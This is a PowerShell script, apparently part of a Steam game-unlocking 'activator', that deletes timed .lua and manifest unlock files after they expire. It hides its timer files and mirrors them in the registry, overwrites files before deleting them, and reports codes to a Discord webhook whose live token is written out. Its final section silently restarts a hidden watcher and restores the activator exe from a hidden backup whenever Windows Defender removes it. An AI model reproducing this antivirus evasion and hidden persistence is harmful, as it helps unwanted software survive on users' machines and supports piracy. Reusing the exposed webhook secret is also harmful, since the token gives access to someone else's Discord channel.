# =====================================================================
# bsmap_cleanup.ps1 v2 - Borrado EXACTO a la hora de internet + proteccion
# - Phase 1: timers (JSON o espejo registro) -> borra .lua + .manifest
# - Phase 2: cabeceras BSMAP_EXPIRES incrustadas en cada .lua (huerfanos)
# - Hora: internet (worldtimeapi -> timeapi.io) con offset persistente
# - Anti-manipulacion: sobrescribe contenido antes de borrar, espejo registro
# - Self-heal: re-registra/re-habilita la tarea y arranca el watcher EXE
# =====================================================================
$ErrorActionPreference = 'SilentlyContinue'
$utf8NoBom = New-Object System.Text.UTF8Encoding $false
$TIMERS_FILE = Join-Path $env:LOCALAPPDATA 'bsmap_timers.json'
$OFFSET_FILE = Join-Path $env:LOCALAPPDATA 'bsmap_offset.json'
$HISTORY_FILE = Join-Path $env:LOCALAPPDATA 'bsmap_codes_history.json'
$REG_PATH = 'HKCU:\Software\Bsmap'
$LOG_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
$LOG_FILE = Join-Path $LOG_DIR 'cleanup.log'
$WATCH_EXE = Join-Path $LOG_DIR 'bsmap_watch.exe'
New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null

$WEBHOOK_URL = "https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"

function Send-ExpiryWebhook {
    param([string]$gameName, [string]$codigo, [string]$root, [string[]]$borrados, [string[]]$fallidos)
    try {
        $bt = [char]96
        $content = "**EXPIRADO:** $gameName`n**Codigo:** $bt$bt$bt$codigo$bt$bt$bt`n**Borrados OK:** $($borrados.Count)`n**NO borrados:** $($fallidos.Count)"
        if ($fallidos.Count -gt 0) { $content += "`n**Archivos que siguen existiendo:**$bt$bt$bt$($fallidos -join "`n")$bt$bt$bt" }
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Send-OrphanWebhook {
    param([string]$gameName, [string]$codigo, [string[]]$manifests)
    try {
        $bt = [char]96
        $content = "**HUERFANO BORRADO:** $gameName`n**Codigo:** $bt$bt$bt$codigo$bt$bt$bt`n**Manifests:** $($manifests.Count)"
        $payload = @{ content = $content } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Write-Log {
    param([string]$m)
    try {
        $fi = Get-Item $LOG_FILE -ErrorAction SilentlyContinue
        if ($fi -and $fi.Length -gt 1MB) { Remove-Item $LOG_FILE -Force -ErrorAction SilentlyContinue }
        Add-Content -Path $LOG_FILE -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $m" -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}

function Get-CodesHistory {
    try {
        if (Test-Path $HISTORY_FILE) {
            $h = Get-Content $HISTORY_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($h)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and $_.code })
        }
    } catch {}
    return ,@()
}

function Add-ExpiredToHistory {
    param($t)
    try {
        $h = @(Get-CodesHistory)
        $h += @{ code = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }; game = $t.game_name; expires_at = $t.expires_at; duration = $t.duration; expired_at = (Get-Date).ToString('o') }
        if ($h.Count -gt 50) { $h = @($h | Select-Object -Last 50) }
        [System.IO.File]::WriteAllText($HISTORY_FILE, (ConvertTo-Json -InputObject @($h) -Depth 10), $utf8NoBom)
    } catch {}
}

# ---- Hora de internet con offset persistente ----
function Get-InternetTime {
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    $override = $env:BSMAP_TIMEAPI_URL
    try {
        if ($override) { $r = Invoke-RestMethod $override -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop; return [datetime]::ParseExact($r.dateTime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime() }
        $r = Invoke-RestMethod 'https://worldtimeapi.org/api/ip' -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop
        return [datetime]::ParseExact($r.utc_datetime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime()
    } catch {
        try {
            $r = Invoke-RestMethod 'https://timeapi.io/api/Time/current/zone?timeZone=UTC' -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop
            return [datetime]::ParseExact($r.dateTime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime()
        } catch { return $null }
    }
}

function Read-Offset {
    try {
        if (Test-Path $OFFSET_FILE) {
            $o = Get-Content $OFFSET_FILE -Raw | ConvertFrom-Json
            if ($o.offset_seconds) { return [double]$o.offset_seconds }
        }
    } catch {}
    return $null
}

function Save-Offset {
    param([double]$sec)
    try { [System.IO.File]::WriteAllText($OFFSET_FILE, (@{ offset_seconds = [math]::Round($sec,1); measured_at = (Get-Date).ToString('o') } | ConvertTo-Json), $utf8NoBom) } catch {}
}

# Retorna ($now, $isNet). Sin internet usa el offset medido (misma linea temporal).
function Get-NowEx {
    $net = Get-InternetTime
    if ($net) {
        $off = ((Get-Date) - $net).TotalSeconds
        if ([math]::Abs($off) -gt 1) { Save-Offset $off }
        return $net, $true
    }
    $off = Read-Offset
    if ($off) { return (Get-Date).AddSeconds(-$off), $false }
    return (Get-Date), $false
}

# ---- Borrado duro: sobrescribe contenido antes de eliminar ----
function Overwrite-Delete {
    param([string]$p)
    if (-not $p -or -not (Test-Path -LiteralPath $p)) { return $true }
    for ($i = 0; $i -lt 3; $i++) {
        try {
            $a = Get-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
            if ($a) { $a.Attributes = 'Normal' }
            try {
                $fs = [System.IO.File]::Open($p, 'Open', 'Write', 'None')
                $len = [int][Math]::Min($fs.Length, 1MB)
                if ($len -gt 0) { $junk = New-Object byte[] $len; (New-Object System.Random).NextBytes($junk); $fs.Write($junk, 0, $len); $fs.Flush($true) }
                $fs.Close()
            } catch {}
            [System.IO.File]::Delete($p)
            if (-not (Test-Path -LiteralPath $p)) { return $true }
        } catch {}
        Start-Sleep -Milliseconds 300
    }
    return (-not (Test-Path -LiteralPath $p))
}

# ---- Timers: guardado con espejo en registro ----
function Save-TimersFile {
    param($t)
    try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}
    if (-not $t -or $t.Count -eq 0) {
        [System.IO.File]::WriteAllText($TIMERS_FILE, '[]', $utf8NoBom)
        try { Set-ItemProperty -Path $REG_PATH -Name 'Timers' -Value '[]' -Type String -Force -ErrorAction SilentlyContinue } catch {}
    } else {
        $t = @(foreach ($el in @($t)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
        [System.IO.File]::WriteAllText($TIMERS_FILE, (ConvertTo-Json -InputObject @($t) -Depth 10), $utf8NoBom)
        try { New-Item -Path $REG_PATH -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path $REG_PATH -Name 'Timers' -Value (ConvertTo-Json -InputObject @($t) -Compress -Depth 10) -Type String -Force -ErrorAction SilentlyContinue } catch {}
    }
    try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
}

function Get-Timers {
    if (Test-Path $TIMERS_FILE) {
        try {
            $parsed = Get-Content $TIMERS_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($parsed)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and $_.expires_at })
        } catch {}
    }
    try {
        $reg = (Get-ItemProperty -Path $REG_PATH -Name 'Timers' -ErrorAction SilentlyContinue).Timers
        if ($reg) {
            $rt = @(foreach ($el in @($reg | ConvertFrom-Json)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            if ($rt.Count -gt 0 -and $rt[0].expires_at) {
                [System.IO.File]::WriteAllText($TIMERS_FILE, ($rt | ConvertTo-Json -Depth 10), $utf8NoBom)
                return ,$rt
            }
        }
    } catch {}
    return ,@()
}

# =====================================================================
# Phase 1: timers expirados
# =====================================================================
$timers = Get-Timers
$now, $isNet = Get-NowEx
$remaining = @()
$expired = @()
foreach ($t in $timers) {
    if (-not $t -or -not $t.expires_at) { continue }
    $exp = $t.expires_at -as [datetime]
    if (-not $exp) { continue }
    if ($exp -le $now) {
        $gameStillActive = $false
        foreach ($other in $timers) {
            if ($other -eq $t) { continue }
            if ($other.game_name -and $other.game_name -eq $t.game_name) {
                $oExp = $other.expires_at -as [datetime]
                if ($oExp -and $oExp -gt $now) { $gameStillActive = $true; break }
            }
        }
        if ($gameStillActive) { $remaining += $t; continue }
        $expired += $t
    } else { $remaining += $t }
}
foreach ($t in $expired) {
    $root = $t.steam_root
    if (-not $root -or -not (Test-Path $root)) {
        Write-Log "WARN timer sin root valido: game=$($t.game_name) root=$root"
        continue
    }
    $borrados = @()
    $fallidos = @()
    foreach ($f in @($t.lua_files)) {
        $p1 = Join-Path (Join-Path $root 'config\stplug-in') $f
        $p2 = Join-Path (Join-Path $root 'config\lua') $f
        if (Overwrite-Delete $p1) { $borrados += $f } else { $fallidos += $f }
        if ($p2 -ne $p1) { if (Overwrite-Delete $p2) { $borrados += $f } else { $fallidos += $f } }
    }
    foreach ($f in @($t.manifest_files)) {
        $p3 = Join-Path (Join-Path $root 'config\depotcache') $f
        if (Overwrite-Delete $p3) { $borrados += $f } else { $fallidos += $f }
    }
    $msg = "P1 BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) exp=$($t.expires_at) root=$root OK=$($borrados.Count) FALLIDOS=$($fallidos.Count)"
    Write-Log $msg
    Add-ExpiredToHistory $t
    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_juego_expirado.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - OK: $($borrados.Count) | FALLIDOS: $($fallidos.Count)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
    Send-ExpiryWebhook -gameName $t.game_name -codigo $t.redeem_code -root $root -borrados $borrados -fallidos $fallidos
}
# Solo guardar si se borro algo: evitar sobrescribir una activacion concurrente (carrera)
if ($expired.Count -gt 0) { Save-TimersFile $remaining }

# =====================================================================
# Phase 2: cabeceras BSMAP_EXPIRES en .lua (proteccion huerfanos/manifest)
# =====================================================================
$activeGames = @{}
foreach ($at in $remaining) { if ($at.game_name) { $activeGames[$at.game_name] = $true } }
$steamPaths = @("${env:ProgramFiles(x86)}\Steam", "${env:ProgramFiles(x86)}\Steamm", "$env:ProgramFiles\Steam", "C:\xdd")
try { $p = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam' -Name InstallPath -ErrorAction SilentlyContinue).InstallPath; if ($p) { $steamPaths += $p } } catch {}
try { $p = (Get-ItemProperty -Path 'HKCU:\SOFTWARE\Valve\Steam' -Name SteamPath -ErrorAction SilentlyContinue).SteamPath; if ($p) { $steamPaths += $p } } catch {}
$steamPaths = $steamPaths | Where-Object { $_ -and (Test-Path $_) } | Select-Object -Unique
$now, $isNet = Get-NowEx
foreach ($root in $steamPaths) {
    foreach ($sub in @('config\stplug-in', 'config\lua')) {
        $dir = Join-Path $root $sub
        if (-not (Test-Path $dir)) { continue }
        Get-ChildItem "$dir\*.lua" -ErrorAction SilentlyContinue | ForEach-Object {
            $luaPath = $_.FullName
            try {
                $c = [System.IO.File]::ReadAllText($luaPath)
                $m = [regex]::Match($c, '--\s*BSMAP_EXPIRES:\s*(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})')
                if (-not $m.Success) { return }
                $exp = [datetime]::ParseExact($m.Groups[1].Value, 'yyyy-MM-ddTHH:mm:ss', $null)
                $gm = [regex]::Match($c, '--\s*BSMAP_GAME:\s*(.+)')
                $gameName = if ($gm.Success) { $gm.Groups[1].Value.Trim() } else { $null }
                if ($gameName -and $activeGames.ContainsKey($gameName)) { return }
                if ($exp -le $now) {
                    $mirror = Join-Path (Join-Path $root $sub) $_.Name
                    Overwrite-Delete $luaPath | Out-Null
                    if ($mirror -ne $luaPath) { Overwrite-Delete $mirror | Out-Null }
                    $mm = [regex]::Match($c, '--\s*BSMAP_MANIFESTS:\s*(.+)')
                    $mc = [regex]::Match($c, '--\s*BSMAP_CODE:\s*(.+)')
                    $manifests = @()
                    if ($mm.Success) { $manifests = @($mm.Groups[1].Value -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ }) }
                    foreach ($mf in $manifests) {
                        Overwrite-Delete (Join-Path (Join-Path $root 'config\depotcache') $mf) | Out-Null
                    }
                    $codeTag = if ($mc.Success) { $mc.Groups[1].Value.Trim() } else { '?' }
                    Write-Log "P2 BORRADO(HUERFANO): $gameName lua=$($_.Name) manifest=$($manifests -join ',') codigo=$codeTag root=$root"
                    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_juego_expirado.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] P2 ORFAN BORRADO: $gameName ($codeTag)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
                    Send-OrphanWebhook -gameName $gameName -codigo $codeTag -manifests $manifests
                }
            } catch {}
        }
    }
}

# =====================================================================
# Self-heal: tarea + watcher
# =====================================================================
try { & powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File (Join-Path $LOG_DIR 'ensure_task.ps1') *> $null } catch {}
try {
    if ((Test-Path $WATCH_EXE) -and -not (Get-Process bsmap_watch -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $WATCH_EXE -WindowStyle Hidden
        Write-Log "Watcher lanzado"
    }
} catch { Write-Log "ERROR self-heal watcher: $($_.Exception.Message)" }

# =====================================================================
# Self-heal: exe del activador (si Defender lo borra)
# =====================================================================
$ACTIVATOR_EXE = Join-Path $env:USERPROFILE 'OneDrive\Desktop\steamsixd\exe\BastissSteamActivator2.exe'
$ACTIVATOR_BAK = Join-Path $LOG_DIR 'activator_exe.bin'
try {
    if (Test-Path $ACTIVATOR_EXE) {
        Copy-Item -LiteralPath $ACTIVATOR_EXE -Destination $ACTIVATOR_BAK -Force -ErrorAction SilentlyContinue
        $bak = Get-Item $ACTIVATOR_BAK -ErrorAction SilentlyContinue
        if ($bak) { $bak.Attributes = 'Hidden,Archive' }
    } elseif (Test-Path $ACTIVATOR_BAK) {
        Copy-Item -LiteralPath $ACTIVATOR_BAK -Destination $ACTIVATOR_EXE -Force -ErrorAction SilentlyContinue
        (Get-Item $ACTIVATOR_EXE -Force -ErrorAction SilentlyContinue).Attributes = 'Archive'
        Write-Log "Activador restaurado desde backup oculto"
        Start-Process -FilePath $ACTIVATOR_EXE -ArgumentList '-min'
    }
} catch { Write-Log "ERROR self-heal activador: $($_.Exception.Message)" }
exit 0
